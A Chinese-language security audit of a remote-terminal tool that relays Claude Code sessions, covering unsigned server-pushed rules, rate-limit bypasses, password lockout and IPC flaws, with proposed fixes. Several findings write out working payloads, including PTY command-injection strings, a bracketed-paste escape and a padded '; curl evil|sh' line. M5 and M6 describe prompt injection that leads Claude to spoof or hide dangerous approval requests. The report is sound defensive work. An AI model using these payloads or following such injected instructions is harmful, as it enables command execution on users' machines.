## 一、高

### H1　服务端下发的输入规则和动作目录无签名，可在被控端注入任意输入

- 位置：`crates/rterm-core/src/host/adapter.rs:149-193`（`validate`）、`:323-360`（`build_submit`）；`host/actions.rs:253-384`（`validate_action`）、`:725-828`（`run_action`）；`core.rs:1282-1295`（`apply_server_config_to_host`，约行号）；`server/src/service/config-service.ts:45-49`（`adapters`、`claude_catalog` 的校验只检查“是数组”）；`server/src/api/admin.ts`（`PUT /v1/admin/config/:key`）。
- 问题：`GET /v1/config` 返回的 `adapters` 和 `claude_catalog` 没有签名，客户端只做结构校验后就应用到所有被控端。校验没有限制内容的语义：
  1. 适配器规则里的 `newline_in_paste`、`fallback_newline`、`submit_key`（≤16 字节）会原样写进 PTY。校验只拒绝**恰好包含** `ESC[201~` 的字符串。
  2. 动作目录里的 `submit`/`type` 步骤模板（≤500 字符）可以是任意文本，`keys` 步骤可以发送 `ctrl+<字母>`、`enter`、`esc` 等。
  3. 目录里的 `permission.allow` 动作、`hidden` 标志都由下发的数据决定，不是安全边界。
- 利用场景（已复现）：
  - 攻击者拿到 `ADMIN_TOKEN`，或攻破信令服务器，或在客户端启用“使用系统证书库”的企业 TLS 解密环境里做中间人。
  - 下发规则 `{"id":"x","match":{},"paste":"raw","fallback_newline":"\r;id>x;\r"}`。当主控端在一个未开启 bracketed paste 的终端（cmd.exe、旧版 bash）里发多行消息 `echo a\necho b` 时，写入 PTY 的字节是 `echo a\r;id>x;\recho b`，即额外执行了攻击者的命令。
  - 绕过 `ESC[201~` 检查：下发 `newline_in_paste = "\u001b[20"`，主控端发 `line1\n1~;calc\nline3`，写入字节为 `ESC[200~line1 ESC[201~;calc ESC[20 line3 ESC[201~`。粘贴被提前结束，`;calc` 作为键盘输入执行。
  - 下发目录把 `session.clear` 的步骤改成 `{"submit":"!<命令>"}`（Claude Code 的 `!` 前缀直接执行 shell）。主控端用户点一次“清空对话”就在被控端执行。
- 影响：这直接违背 §8.1“服务端被攻破……端到端加密”这一行对威胁模型的预期（服务端不应能影响被控端的 shell）。一旦 `ADMIN_TOKEN` 泄露，影响的是所有在线被控端。
- 验证：`<审查用源码副本>\crates\rterm-core\tests\review.rs` 中 `remote_rule_can_reassemble_paste_end`、`remote_rule_fallback_newline_injects_command`，输出见上。
- 修复建议：
  1. 对 `adapters` 与 `claude_catalog` 做离线签名（Ed25519，公钥内置在客户端，私钥不放在服务器上），客户端验签失败整份丢弃。`cached_config` 同样要验签。
  2. 即使有签名，也收紧语义：规则里的三个字符串只允许 `\r`、`\n`、`\\\r` 等白名单取值；目录模板拒绝以 `!` 开头，拒绝 `ctrl+c/d/z` 之外的组合时要有理由；`permission.*` 的步骤只能是固定的 `enter`/`esc`。
  3. 管理接口里的 `adapters`/`claude_catalog` 写入需要二次确认或独立的发布流程。

## 二、中

### M1　IP 限流按完整 IPv6 地址计数，/64 即可绕过注册限流、连接限流、枚举封禁

- 位置：`server/src/util/ip.ts`（`normalizeIp` 不聚合 IPv6 前缀）；`server/src/service/registration.ts:38`（`reg:ip:`，10 次/小时）；`server/src/signal/handlers.ts:240`（`cr:ip:min:`）、`:65`（`authfail:ip:`）；`server/src/signal/server.ts:89,100`（同 IP 50 条连接）。
- 问题：所有 IP 维度的限流 key 是完整地址。拥有一个 /64（常见的家庭/VPS 分配）的攻击者有 2^64 个“不同 IP”。
- 利用场景：写脚本每次用新的 IPv6 源地址注册新设备（10 次/小时/IP 的限制形同虚设），每个新设备能做 20 次“不存在/不在线”的探测才会被 `recordMiss` 封禁（`handlers.ts:225`，阈值 20/10 分钟）。设备码是 9 位十进制（`crypto.ts` 的 `newDeviceCode`），在线设备数为 N 时，扫描命中率约 N/9×10^8，无上限地扫就能枚举在线设备码，再配合 M3 对目标做定向攻击。
- 修复建议：IPv6 按 /64（可选 /56）聚合后再作为限流 key；注册增加额外约束（工作量证明或验证码，或按 ASN/聚合前缀限流）；封禁枚举来源时同时封 IP 前缀而不仅是设备。

### M2　信令消息类型直接作为指标标签，未认证客户端可撑爆内存

- 位置：`server/src/signal/server.ts:125`（`ctx.m.signalMessages.inc({ t: msg.t.length <= 24 ? msg.t : 'other' })`）；`server/src/metrics.ts` 的 `Counter.inc`（`Map` 无上限）。
- 问题：这行在认证状态检查**之前**执行，任何人建立 WebSocket 后发 `{"t":"<任意 ≤24 字符>"}` 就会新增一个指标序列；`Counter` 的 `Map` 永不清理，`/metrics` 输出也随之变大。
- 利用场景：脚本循环建立连接（每 IP 50 条，换 IPv6 则无上限），每条连接发 200 条/10 秒随机类型名。服务端内存持续增长直至被 OOM，Prometheus 抓取同时变慢。
- 修复建议：只对白名单类型（`ping`、`auth`、`connect.request`……）单独计数，其余归入 `other`；在认证通过后再计数。给 `Counter` 加序列数上限。

### M3　任何已注册设备都可对任意设备码做可用性攻击（定向限流占用 + 全局锁定）

- 位置：`server/src/signal/handlers.ts:242`（`cr:tgt:min:${target}` 全体共享 20 次/分钟）；`crates/rterm-core/src/host/guard.rs:381-423`（失败计数是被控端全局的，不区分来源）；`server/src/service/guard.ts` 的 `recordAuthFailure`。
- 问题：
  1. 目标被连接的预算是所有主控端共享的 20 次/分钟。攻击者持续每分钟发 20 次连接请求，其他主控端会一直收到 `RATE_LIMITED`。不需要知道密码，且目标主机会收到 20 次 `connect.incoming`（开启“连接确认”时是 20 个弹窗）。
  2. 密码错误锁定是整台被控端的：攻击者故意错 5 次就能把被控端锁 10 分钟，之后翻倍到 24 小时，并触发临时密码刷新，合法用户拿着旧临时密码也进不来。
- 利用场景：知道（或扫出）目标 9 位设备码后，写脚本循环 `connect.request` 并故意输错密码。受害者的真实主控端被拒绝（`RATE_LIMITED`/`LOCKED`），且没有任何办法区分攻击者。
- 说明：这是 §5.5.6/§6.6 的设计取舍，不是实现错误，但影响面应当被明确接受。
- 修复建议：失败计数分维度：按来源设备/IP 单独计数与封禁，全局锁定只作为兜底；目标预算改为“每来源设备”维度，另设一个更高的全局阈值；已经成功认证过的主控设备（公钥白名单）可享有更宽松的限额；被控端界面提供“允许的主控设备”列表。

### M4　固定密码强度检查过弱，且锁定级别在 24 小时封顶后归零，在线猜测速率约 16 次/天

- 位置：`crates/rterm-core/src/host/guard.rs:139-190`（`validate_fixed_password`，`COMMON` 仅 27 项）；`:35`、`:387-392`（`RESET_AFTER`）。
- 问题：
  1. 8 位起、非纯数字、不在 27 项小表里即通过。实测通过：`Passw0rd!`、`Aa123456`、`zaq12wsx`、`baseball`、`Summer2024`、`qwer1234`、`12345678a`、`iloveyou2`。
  2. 锁定时长 10 分钟 ×2^级别，封顶 24 小时；而 `lock_level` 在“距上次失败 ≥ 24 小时”时归零。封顶那次锁定恰好是 24 小时，锁定一结束级别就清零，循环重新开始。
- 验证：`review.rs` 的 `guard_lock_cycle`：每轮 5 次猜测，第 9 轮（t≈66.5 小时，累计 45 次猜测）后又回到 10 分钟锁定。平均约 16 次猜测/天。固定密码在被控端不会因锁定而刷新（只有临时密码刷新），所以一个落在前 1000 个常见密码里的固定密码，约 2 个月内就会被试到（1000 ÷ 16 次/天）。
- 利用场景：攻击者知道设备码后长期低速猜测，匹配常见密码表。
- 修复建议：固定密码改用 zxcvbn 类评分或提高最小长度（≥10 且字符类别/熵检查）；`lock_level` 在锁定期满后不立即清零（例如从“最后一次失败 + 锁定时长”起再算 24 小时）；触发锁定时提示用户固定密码被连续猜测；对固定密码同样提供“触发锁定后可选自动停用”的开关。

### M5　状态回传的本机 IPC 无认证，终端内任何进程都能伪造 hook 事件和权限卡片

- 位置：`crates/rterm-core/src/host/status.rs:175-282`（`BridgeServer`）、`:157-172`（`parse_message`）、`:580-642`（`apply_hook`）；`host/actions.rs:738-748`（`permission.allow`/`deny` 的校验）。
- 问题：
  1. IPC 消息只有 `term_id`/`kind`/`payload`，没有任何凭据。`term_id` 和管道/套接字地址（`RTERM_HOOK_ENDPOINT`）通过环境变量交给终端里的**所有**子进程，包括 Claude 通过 Bash 工具执行的命令。注释“别的进程猜不到”对 Windows 不成立：命名管道名可以被任何本地用户枚举（`\\.\pipe\` 目录可列出）。
  2. Windows 使用 `GenericNamespaced` 命名管道，`ListenerOptions` 没有设置 `security_descriptor`（`status.rs:230`），用的是系统默认 DACL（默认授予 Everyone 读取权限，写入权限限定为所有者/SYSTEM/管理员）。**待确认**其他本地用户能否写入：用第二个 Windows 账号对该管道 `CreateFile(GENERIC_WRITE)`，或用 `accesschk -lv \pipe\<名字>` 查看 DACL。
  3. Unix 套接字文件 0600，同用户外的进程不能连，这部分没有问题。
- 利用场景：仓库里有提示注入，让 Claude 执行一个（已被用户批准过的）普通命令，该命令向 `RTERM_HOOK_ENDPOINT` 写入 `{"term_id":…,"kind":"hook","payload":{"hook_event_name":"PermissionRequest","tool_name":"Read","tool_input":{"file_path":"README.md"}}}`。远端用户在界面上看到的是一张无害的权限卡片，而 Claude Code 真正在等待的是另一个危险命令的确认。用户点“允许”就会发送 Enter，通过那个真实的确认。`notice_id` 校验只能保证“发的是当前卡片”，不能保证卡片内容来自 Claude。
- 修复建议：给 `RTERM_HOOK_ENDPOINT` 增加每终端一次性令牌（在 `hook_command` 里由 `rterm-cli` 读取；注意终端内进程仍能读取环境变量，因此令牌只能限制“其他用户”，不能完全限制终端内进程）。真正的缓解是 UI 层：权限卡片显示完整命令、对“可疑来源”（短时间内多次 PermissionRequest、与实际屏幕内容不一致）给出提示，并考虑不通过卡片一键允许高风险工具（Bash/PowerShell/Write）。Windows 上显式设置仅所有者可写的 DACL。

### M6　权限卡片的命令摘要被截断到 500 字符，却支持一键“允许”

- 位置：`crates/rterm-core/src/host/status.rs:32`（`TOOL_SUMMARY_MAX`）、`:515-552`（`truncate_chars`、`tool_summary`）。
- 问题：超长命令只显示前 500 字符加“…”，后半段对远端用户不可见。
- 利用场景（已验证截断行为：输入约 563 字符，输出 503 字符）：被注入的 Claude 生成 `echo ok ok ok …`（500 字符以上）后接 `; curl evil|sh`。用户在手机/远端界面看到“看起来无害”的前缀，点“允许”。
- 修复建议：摘要超过阈值时不提供一键允许，要求展开查看完整命令（或在被控端本机确认）；摘要里把换行、`;`、`&&`、`|` 的位置做高亮；对 Bash/PowerShell 工具始终展示完整命令。

## 三、低

### L1　主控端对被控端公钥变化的检测发生在握手完成之后

- 位置：`crates/rterm-core/src/relay.rs:493-500`；`controller/connect.rs:175-190`（`known_host_key` 随后才被比较）。
- 问题：已知公钥与信令下发的公钥不同时，仍先完成 PAKE 并发出 `PakeConfirm`，握手结束后才返回 `PeerKeyChanged`。恶意信令服务器可以用自己的公钥冒充被控端，对每次连接尝试获得一次“在线猜密码”的机会（它看到主控端的确认 MAC 后能验证 1 个候选密码），且没有被控端锁定机制可限制它。
- 修复建议：在 `establish_controller_ex` 开始、发出 `PakeInit` 之前，把 `params.host_public_key`（信令下发）与 `known_host_key` 比较；不一致且 `!accept_key_change` 直接返回 `PeerKeyChanged`，不进入握手。首次连接（无已知公钥）无法防御，只能靠密码强度。

### L2　`derive_pw_key` 失败时返回全零密钥（fail-open）

- 位置：`crates/rterm-core/src/crypto/mod.rs:32`（`unwrap_or([0u8; 32])`）、`:53`（`return [0u8; 32]`）；`core.rs` 的 `set_fixed_password_offline` 把结果直接 `store_fixed_key`。
- 问题：如果 Argon2 失败或 `spawn_blocking` 被取消，设置固定密码时会把全零密钥存进钥匙串，从而变成“任何知道这一点的人用零密钥就能认证”的固定密码。注释说“握手必然失败”只对主控端成立。触发条件极罕见，但修复很便宜。
- 修复建议：改为返回 `Result`，失败时不保存、不连接。

### L3　`isolate_terminals=false` 时 `TermClose` 可以关闭别人正在使用的终端

- 位置：`crates/rterm-core/src/host/session.rs:638-644`（`on_term_close`）。
- 问题：`TermAttach` 有 `would_be_busy`（`TERM_BUSY`）检查，`TermClose` 没有。§5.5.6 写的是“仍不能抢占别人正在使用的终端”，但另一台主控设备可以用 `kill=true` 把它杀掉。默认（隔离开启）不受影响。
- 修复建议：关闭前复用 `would_be_busy`，被其他设备占用时返回 `TERM_BUSY`。

### L4　终端所有者标识来自信令下发的设备码，而不是握手认证的公钥

- 位置：`crates/rterm-core/src/host/session.rs:348-357`（`owner_of`）；`core.rs`（`handle_incoming` 把信令的 `from.device_code` 作为 `controller_code`）。
- 问题：主控端无法伪造自己的 owner（它来自信令而不是主控端发来的数据），这点是安全的。但它依赖信令服务器的“设备码↔设备”映射可信。恶意信令服务器可以让攻击者设备冒用受害主控端的设备码，攻击者在知道密码的前提下就能拿到受害者的终端。
- 修复建议：owner 改用握手认证出的公钥（优先于设备码），即 `pk:<hex>`。

### L5　PTY 尺寸在 `TermAttach` 路径没有限制

- 位置：`crates/rterm-core/src/host/term.rs:1343-1346`、`:1377-1382`（`cols.min(u16::MAX)`）。
- 问题：`TermOpen` 和 `TermResize` 把尺寸夹在 1–1000，`TermAttach` 只夹到 65535，传给 ConPTY/openpty 的尺寸过大可能占用大量内存或失败。
- 修复建议：与其他入口统一夹到 1–1000。

### L6　inbox 配额检查非原子，空文件可无限创建，清理会跟随符号链接

- 位置：`crates/rterm-core/src/host/inbox.rs:255-261`、`:276`（`dir_size` → 比较 → `reserved.fetch_add` 之间无锁）；`:423-452`（`create_unique`）；`:146`（`p.is_dir()` 跟随符号链接）。
- 问题：
  1. 并发 `FileBegin` 可以在同一时刻都通过 `max_total` 检查，最多超出 8 个文件 ×200MB × 会话数；声明了大小但不发数据的 `FileBegin` 也会占用配额。
  2. 大小为 0 的文件不占配额，可无限创建，每次 `FileBegin` 都要遍历整个 inbox（`dir_size`），文件越多越慢。
  3. `cleanup_expired` 遇到 inbox 下的符号链接目录会进去删除超期文件。需要先在 inbox 里放符号链接，主控端借助终端本来就能做到，所以不构成权限提升。
  4. 同一秒内文件名 `x.png` 与 `x.png.part` 的 `.part` 路径可能碰撞（后者 `final_path` 等于前者的 `part_path`），最终 `rename` 会替换另一个上传的内容。**待确认**，只影响同一主控端自己的上传。
- 修复建议：用一把互斥锁把“计算占用 + 预留”做成原子；文件数量设上限；`cleanup_expired` 用 `symlink_metadata`，不跟随链接；`.part` 使用不可由文件名构造的后缀（如随机 ID）。

### L7　IPC/文件权限与密钥存储的边界情况

- 位置：`crates/rterm-core/src/secrets.rs:144-148`（Windows `write_private` 直接 `fs::write`，没有设置 ACL）；`:115-120`（Unix 上临时文件已存在时 `mode(0o600)` 不生效）；`:199-217`（`FallbackStore` 读失败回落到文件）；`identity.rs:43-53`。
- 问题：
  1. 钥匙串不可用时，设备私钥和固定密码的 `pw_key` 以明文文件保存；Windows 依赖用户目录的继承 ACL，没有显式限定。
  2. `FallbackStore::get` 在钥匙串**暂时出错**（例如登录时钥匙串未解锁）时直接回落到文件，文件不存在就返回 `None`，`Identity::load_or_create` 随即**生成新的设备私钥**并保存。设备身份被静默替换，设备码变化，所有主控端会看到 `PEER_KEY_CHANGED`。
  3. 密钥长度异常（`identity.rs:46-48`）也会静默重新生成。
- 修复建议：`FallbackStore::get` 在主存储返回 `Err` 时向上返回错误而不是回落；重新生成身份前必须确认主存储可写且确实无此项；Windows 上给 secrets 目录显式设置仅当前用户的 DACL。

### L8　密钥材料未完整清零

- 位置：`crates/rterm-core/src/relay.rs:391-417`（`start_mux` 把 `est.keys.c2h/h2c` 复制到栈上的局部变量，再交给 `Sealer::new`）；`crypto/record.rs`（`ChaCha20Poly1305` 未启用 zeroize）；`host/guard.rs:200-210`（`temp_password: String`、`temp_key`、`fixed_key` 为普通类型）；`relay.rs:304-306`（`PasswordInput::Derived` 里的 `[u8; 32]`）。
- 问题：`SessionKeys` 本身是 `ZeroizeOnDrop`，但副本不是；会话结束后密钥可能留在进程内存里。设备私钥由 dalek 的 `SigningKey` 保存，默认会清零，但 `store.get` 返回的 `Vec<u8>` 不会。
- 修复建议：用 `Zeroizing<[u8;32]>` 包装这些副本；给 `chacha20poly1305` 打开 `zeroize` feature；`temp_password` 用 `Zeroizing<String>`。

### L9　锁定状态只在内存里

- 位置：`crates/rterm-core/src/host/guard.rs:255-276`（`Guard::build` 每次创建全新状态）。
- 问题：被控端进程重启即清除锁定计数和级别。若存在能让进程崩溃的输入（本次未发现），攻击者可以借此重置锁定。
- 修复建议：把 `lock_level` 和 `locked_until`（用系统时间）持久化到数据目录。

### L10　服务端细节

- `server/src/config.ts:92,161`：`NODE_ENV` 不是 `production` 时 `TICKET_SECRET` 回落到公开的 `DEV_TICKET_SECRET`。compose 里已设置 `NODE_ENV=production`，但任何漏设环境变量的部署都会静默变成“任何人都能伪造票据”。建议改为默认拒绝，只有显式 `RTERM_DEV=1` 才允许默认密钥。
- `server/src/config.ts:200`：`ADMIN_TOKEN` 没有最小长度检查。管理接口对失败有限流，但同一 /64 内换 IPv6 地址即可绕过（见 M1）。建议生产环境要求 ≥32 字符。
- `server/src/api/update.ts:54`、`server/src/api/config.ts`：`/v1/update/*` 每次请求都查库，没有缓存也没有限流；`/v1/config` 有 60 秒进程内缓存，但同样没有限流。Caddy 没有配置速率限制。未认证请求可对 MySQL 形成放大压力。
- `server/src/api/admin.ts:314`：`download_url` 允许 `http://`。Tauri 更新有签名校验，所以不直接导致替换，但应强制 https。
- `server/src/api/app.ts:21`：自定义的 JSON 解析器用的是裸 `JSON.parse`，绕过了 Fastify 默认的原型污染防护。当前没有发现会触发污染的 `Object.assign`/深拷贝，属于纵深防御问题。
- `server/src/signal/handlers.ts:65,225`：限流存储出错时这两处 fail-open（`authfail` 计数、枚举计数）。其余路径都是 fail-closed，保持一致更好。

### L11　客户端不强制 TLS

- 位置：`crates/rterm-core/src/core.rs:62-65`（`DEFAULT_API_URL` 在没设置 `RTERM_DEFAULT_API_URL` 时是 `http://127.0.0.1:8080`）；`api.rs:298-312`（`resolve_signal_url` 接受 `ws://`）；`relay.rs:124-133`（`relay_endpoint` 不检查 scheme）。
- 问题：服务端下发的 `signal_url`、`relay_url` 没有 scheme 约束。API 地址为 `http://` 时，`/v1/config` 可被篡改（其中包含 H1 的内容），信令地址可被改成攻击者控制的服务器；一次性票据也会明文暴露。
- 修复建议：发布构建里只接受 `https://`/`wss://`（回环地址除外），`RTERM_DEFAULT_API_URL` 缺失时编译失败。

### L12　SPAKE2 和 Ed25519 的实现细节

- `spake2 0.4` 的 `bytes_to_element`（`~/.cargo/registry/src/*/spake2-0.4.0/src/ed25519.rs:82-92`）只做点解压缩，没有拒绝小阶点或做余因子清除。我没有找到能利用它的攻击路径（攻击者拿不到 K 也无法生成合法确认 MAC），但这是 §8.5 已经提到的“该库未经审计”的具体理由，应纳入第三方审查。
- `identity.rs:69-81` 用的是 `verify` 而非 `verify_strict`。服务端 `server/src/crypto.ts:12-23` 用 Node 的 `verify`，同样不拒绝小阶公钥。攻击者只能用这种公钥伪造**自己**的签名，不影响其他设备。
- 三类签名（注册、信令认证、握手 transcript）共用同一把设备密钥。前两者带了 `rterm-register-v1`/`rterm-auth-v1` 前缀，握手签名是对 32 字节哈希的裸签名。由于长度和结构不同，目前无法混淆，但建议给 transcript 签名也加 `rterm-hs-v1` 域前缀（会改变协议，需要升 `proto_ver`）。
- 信令认证（`signal.rs:588`）的签名串不含服务端标识，是标准挑战-应答，依赖 TLS 防止被中继到别的服务器。

## 四、建议（不构成漏洞）

1. `实现方案.md` §8.2 写“32 个字符的字符集”，实际是 31 个（`crypto/mod.rs:13`、`guard.rs:25`），熵约 39.6 位，文档和代码应一致。
2. 临时密码在“每次启动刷新”策略下可以连续使用数周。触发锁定会自动刷新，所以在线猜测不可行，但被泄露后的暴露窗口长。可以增加“超过 N 小时自动刷新”或“有人成功连接后提示刷新”。
3. `core.rs` 的 `ConnectParams` 派生了 `Debug` 且含 `password: String`（`core.rs:187-188`）。目前没有发现把它打印到日志的地方，建议手写 `Debug` 隐去密码，避免日后误用。
4. `status.rs:123-143` 的 `find_user_statusline` 会读取工作目录里 `.claude/settings*.json` 的 `statusLine.command`，放进 `RTERM_USER_STATUSLINE` 后由 `hook_main` 用 `sh -c`/`bash -c`/`cmd /C` 执行（`:369-408`）。这与 Claude Code 自己执行项目状态栏命令等价，但可能早于 Claude Code 的“信任此目录”确认。**待确认**：在一个未信任的目录里用 `claude --settings <statusline-settings.json>` 启动，观察状态栏命令是否在信任对话框之前执行。
5. `actions.rs:866-874`（`check_token`）和默认 `DEFAULT_TOKEN_PATTERN` 允许以 `-` 开头的值（如 `--help`），`claude --model --help` 的行为取决于参数解析器，建议要求首字符是字母或数字。`quote`（`actions.rs:837-864`）在 Windows PowerShell 5.1 下，包含 `"` 的值传给原生程序时可能被重新拆分；cmd 风格的引号在值以 `\` 结尾时可能吞掉右引号。这些只影响命令行参数的边界，主控端本来就拥有完整 shell，所以不构成权限提升。
6. `actions.rs:645-659`（`fill_template`）是逐个参数顺序 `replace`，前一个参数的值里如果含 `{后一个参数名}` 会被再次替换。在内置目录里无害，建议单次扫描替换。
7. `host/session.rs` 对 `CommandListReq` 不限制并发，每个请求都会 `spawn_blocking` 一次磁盘扫描；`HostCtx` 没有对“握手中的会话”计数（`Guard::admit` 只看已认证会话数）。已认证主控端可以制造 CPU/磁盘压力，服务端每台设备最多 8 个会话限制了范围。
8. Redis 凭据即全局信任：额外中继节点（`deploy/docker-compose.relay.yml`）要直连主服务器 Redis。拿到 Redis 密码的人可以向所有信令实例发布 `notice`、`incoming`、`kick`（`server/src/store/bus.ts`），读写票据已用标记。建议给中继使用 Redis ACL 限定的账号和 TLS，或改为经信令代理的受限接口。
9. `deploy/Caddyfile` 的 `@internal path` 在 Caddy 侧挡住 `/v1/admin` 和 `/metrics`，Fastify 的路由是大小写敏感的，所以大小写绕过无效；**待确认**重复斜杠、`%2f` 等变形在 Caddy 与 Fastify 之间的解析差异，可用 `curl --path-as-is https://<API_DOMAIN>//v1/admin/stats` 一类请求实测。即使绕过，仍有 `ADMIN_TOKEN` 兜底，所以生产令牌必须足够长。
10. `tools/ops/sshrun.py:4`、`tools/ops/sshput.py:4` 使用 `paramiko.AutoAddPolicy()`，会自动信任任何主机密钥。这些是运维工具，建议改为固定 `known_hosts`。`部署指南.md` §14 里包含测试服务器的 IP 和明文密码（文中已声明仅测试用），发布仓库前需要删除该节。
11. 中继 `server/src/relay/server.ts` 没有限制并发连接数/每 IP 连接数。无效票据连接会立即以 4001 关闭，开销小；有效但未配对的连接最多存活 15 秒、缓存 256KB/64 条。建议在 Caddy 或系统层对 `/v1/relay` 做连接数限制。
12. 记录层没有“认证的结束标记”：中继可以丢弃一个方向的尾部记录，接收方只会看到连接断开（和网络故障无法区分）。要求关键收尾信息（如退出码）只依赖 `Bye`/`TermExit` 帧时，需要意识到这一点。

## 五、看起来有问题，实际安全

| 点 | 为什么安全 |
|---|---|
| 粘贴注入（`ESC[201~`）：`adapter.rs:239-252` 的 `sanitize` | 先循环去除 `ESC[201~`/`ESC[200~`，随后 `chars().filter(!is_control)` 会删除 ESC（U+001B）及所有 C1 控制字符（U+0080–009F，包括 8 位 CSI U+009B）。已测试：`a\x1b[201~b\u{9b}201~c\x1b[2\x1b[201~01~d` → `ab201~cd`，不残留任何 ESC。唯一的问题来自 H1 的下发规则，而不是用户文本。 |
| 路径穿越：`inbox.rs:474-501` 的 `sanitize_filename` | 取最后一段（同时处理 `/` 和 `\`）、替换 `<>:"/\|?*` 和控制字符、去除零宽/双向控制字符、去首尾的点和空格、处理保留名。已测试 `..\..\evil.exe`→`evil.exe`、`CON .txt`→`_CON .txt`、`a:b`→`a_b`（含 ADS）。最终文件名还会加 `HHMMSS-` 前缀，设备保留名不再起作用；`:272-275` 额外检查了 `starts_with(inbox)` 和父目录。 |
| 握手只允许一次尝试，状态机重放 | 每个状态方法消费 `self`（`handshake.rs`），一次连接只能走一遍；被控端每次 `on_init` 用新的 `nonce_h`，重放旧 `PakeInit` 得到新密钥，旧确认无效（测试 `replayed_init_gets_fresh_keys`）。 |
| 被控端没有该类密码时是否泄露 | `HostStart::on_init`（`handshake.rs:250-254`）用随机口令继续走完，行为和耗时与“密码错误”一致；锁定/关闭时 `Guard::pw_key` 返回 `None` 同样走随机口令。 |
| MAC 时序 | `verify_mac` 使用 `verify_slice`（常数时间），角色字节分离防反射（测试 `keys_distinct_and_mac_roles`）。服务端票据用 `timingSafeEqual`，管理令牌先哈希再 `timingSafeEqual`。 |
| nonce 重用、重放、乱序、篡改 | 每方向独立密钥，密钥由包含双方随机数和 session_id 的 transcript 派生；计数器 nonce 不随记录传输；解密失败直接关闭连接（`mux.rs:220-237`）。`any_byte_flip_fails`、`reordered_records_fail`、`replay_and_wrong_key_fail` 覆盖。 |
| 中继冒充 | 主控端检查 `PakeResp.public_key == 信令下发的公钥`；双方对 transcript 签名并互验，改动任何字节握手都会失败（`any_tampered_byte_breaks_handshake` 逐字节遍历）。MITM 若不知道密码无法通过确认 MAC。 |
| 临时密码熵与生成 | `rand::random_range` 是无偏均匀采样、密码学安全随机数；触发锁定会自动刷新临时密码，在线猜测的进度每 5 次就作废。 |
| 失败计数是否能被伪造 | 服务端只接受被控端上报的 `auth_failed`（`handlers.ts` 的 `onSessionReport` 里 `if (!isHost) return`），主控端或第三方无法替别人累计锁定次数。 |
| 设备码枚举 | 不存在、不在线、`accept=false` 统一返回 `UNAVAILABLE`；枚举计数先于限流；在线设备本来就无法与离线设备隐藏（会收到真实答复/超时），防枚举的实际依据是限流和自动封禁（但见 M1）。 |
| 票据 | HMAC-SHA256、30 秒过期、`node` 名绑定、角色绑定、`ticket:used:{sid}:{role}` 一次性标记；`Redis` 出错时 `admit` 抛出并以 4006 拒绝（fail-closed）。URL 中的 `ticket` 不在日志里（Caddy 默认不开访问日志，pino 对 `ticket` 做了 redact）。 |
| SQL 注入 | `server/src/db/repos/mysql.ts` 全部使用 knex 查询构建器或带 `?` 参数的 `raw`；没有字符串拼接用户输入。迁移里的 `knex.raw` 只用常量。Redis 键里的设备码在使用前已被 `/^\d{9,12}$/` 校验。`npm audit --omit=dev`：0 个漏洞。 |
| 日志泄露 | 未发现在 `tracing`/`pino` 调用里输出密码、票据、私钥；设备码在客户端日志中用 `mask_code` 只保留后 4 位。 |
| 管理接口暴露 | `/v1/admin/*`、`/metrics` 在 `API_DOMAIN` 被 Caddy 返回 404；`SIGNAL_DOMAIN`、`RELAY_DOMAIN` 只放行各自路径，其余 404。`ADMIN_TOKEN` 未配置时整个管理接口 404。`TRUST_PROXY=true` 的前提是容器不映射端口，`docker-compose.yml` 确实没有给 signal/relay/mysql/redis 映射端口。 |
| Unix 上 IPC 权限 | 套接字创建时指定 `0600`（`status.rs:212`），同一台机器的其他用户无法连接。 |
| 命令行参数注入（`build_claude_command`） | 模型名走正则白名单，权限模式/强度走枚举，会话名去控制字符后按 shell 引号规则加引号（PowerShell 单引号并统一弯引号，POSIX 单引号转义，cmd 拒绝 `"` 和 `%`）；拒绝 `bypassPermissions`。且主控端本身可通过 `Custom` 档位和 `TermInput` 执行任意命令，这里不构成权限边界。 |
